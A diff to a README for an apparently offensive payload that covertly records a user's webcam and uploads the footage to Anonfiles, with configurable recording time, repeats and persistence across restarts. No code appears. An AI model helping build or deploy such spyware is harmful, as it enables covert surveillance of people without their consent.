@@ -1,11 +1,12 @@
 # Keyloger 2 Discord
 
-This payload exfills user voice as text to discord
+This payload records the users Webcam and uploads the recording to Anonfiles using the DirectX and DShowNET assemblies
 
 You must edit the following parameters on the payload:
-* Hook - your Discord hook
-* RunTime - How many minutes the logger shoud run before sending
+* anontoken - your AnonfilesToken
+* RecordTime - Length, in seconds, of each recording
 * TimesRun - How many times the logger should run before exit
+* Delay - Delay in seconds between each recording
 * Persistent - Must be $true or $false. Indicates whether or not the keylogger persist between restarts.
 
 ## DISCLAIMER
